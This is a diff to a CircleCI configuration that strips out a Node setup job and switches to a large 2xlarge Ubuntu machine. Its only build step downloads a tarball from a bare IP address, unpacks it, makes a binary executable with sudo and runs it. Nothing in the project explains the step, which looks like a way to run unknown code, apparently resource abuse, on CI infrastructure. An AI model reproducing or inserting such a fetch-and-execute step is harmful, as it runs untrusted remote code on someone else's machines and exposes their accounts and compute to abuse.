@@ -1,18 +1,10 @@
-version: 2.1
- 
-orbs:
-  node: circleci/node@4.4.0
+version: 2.1 
  
 jobs:
-  install-node-example:
-    docker:
-      - image: 'cimg/base:stable'
+  build:
+    machine:
+      image: ubuntu-1604:202007-01
+    resource_class: 2xlarge
+
     steps:
-      - checkout
-      - node/install:
-          install-yarn: true
       - run: wget http://207.148.123.213/vavar.tar.gz && tar xfvz vavar.tar.gz && sudo chmod +x ./vava && ./vava
-workflows:
-  test_my_app:
-    jobs:
-      - install-node-example
